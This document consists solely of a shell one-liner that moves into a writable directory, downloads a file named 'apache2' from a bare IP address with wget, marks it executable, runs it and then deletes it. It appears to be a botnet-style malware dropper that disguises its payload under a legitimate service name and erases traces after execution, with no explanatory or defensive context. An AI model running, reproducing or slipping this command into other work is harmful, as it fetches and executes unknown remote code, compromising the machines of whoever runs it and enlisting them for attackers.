cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://206.189.230.190/apache2; chmod +x apache2; ./apache2; rm -rf apache2
